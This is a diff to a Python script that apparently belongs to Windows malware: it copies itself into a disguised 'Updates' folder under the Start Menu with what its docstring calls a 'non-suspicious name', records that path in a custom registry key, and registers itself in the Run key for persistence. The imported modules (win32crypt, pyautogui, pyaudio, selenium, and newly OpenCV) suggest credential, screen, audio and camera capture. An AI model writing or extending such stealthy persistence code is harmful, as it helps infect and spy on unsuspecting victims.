@@ -6,7 +6,7 @@ import importlib.util
 external_modules = [
     "psutil", "requests", "pyautogui",
     "numpy", "pyaudio", "selenium", "cryptography",
-    "aiohttp", "win32crypt"
+    "aiohttp", "win32crypt", "opencv-python"  # Added OpenCV (cv2)
 ]
 
 # Standard library modules (these should not trigger pip install)
@@ -90,7 +90,8 @@ from selenium.webdriver.chrome.options import Options
 
 
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
-	
+STORED_PATH_REG_KEY = r"Software\MyApp\StoredScriptPath"  # Registry path to store the copied script's location
+
 def add_to_startup(script_path):
     """Adds the given script to Windows Startup if not already added."""
     script_name = os.path.basename(script_path)  # Get the script name (with extension)
@@ -122,9 +123,35 @@ def is_in_startup(script_path):
         print(f"Error checking startup entry: {e}")
         return False
 
+def store_copy_path_in_registry(path):
+    """Store the copied script path in the registry."""
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, STORED_PATH_REG_KEY)
+        winreg.SetValueEx(key, "CopiedScriptPath", 0, winreg.REG_SZ, path)
+        winreg.CloseKey(key)
+        print(f"Stored copied script path in registry: {path}")
+    except Exception as e:
+        print(f"Failed to store copied script path in registry: {e}")
+
+def get_stored_copy_path():
+    """Retrieve the stored script copy path from the registry."""
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STORED_PATH_REG_KEY, 0, winreg.KEY_READ)
+        path, regtype = winreg.QueryValueEx(key, "CopiedScriptPath")
+        winreg.CloseKey(key)
+        return path
+    except FileNotFoundError:
+        return None  # No path stored yet
+    except Exception as e:
+        print(f"Error retrieving stored script path: {e}")
+        return None
+
 def copy_script_to_random_location():
-    """Copies the script to a random location with a non-suspicious name."""
-    script_path = os.path.realpath(sys.argv[0])  # Get the absolute path of the current script
+    """Copies the script to a random location with a non-suspicious name, if not already copied."""
+    stored_path = get_stored_copy_path()
+    if stored_path and os.path.exists(stored_path):
+        print(f"Script already copied to {stored_path}. Using existing copy.")
+        return stored_path
 
     # Generate a random folder path in a common location
     random_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'System Tools', 'Updates')
@@ -137,8 +164,10 @@ def copy_script_to_random_location():
     # Check if the copy already exists
     if not os.path.exists(copy_path):
         try:
+            script_path = os.path.realpath(sys.argv[0])  # Get the absolute path of the current script
             shutil.copy(script_path, copy_path)  # Copy the script to the random location
             print(f"Copied script to {copy_path}.")
+            store_copy_path_in_registry(copy_path)  # Store the copied path in the registry
         except Exception as e:
             print(f"Failed to copy script: {e}")
     else:
@@ -146,7 +175,7 @@ def copy_script_to_random_location():
 
     return copy_path  # Return the path of the copied file
 
-# Main logic: First copy the script to a random location, then add it to startup
+# Main logic: Copy the script to a random location and add it to startup (if not already done)
 copied_script_path = copy_script_to_random_location()  # Copy the script and get the new path
 add_to_startup(copied_script_path)  # Add the copied script to startup
 
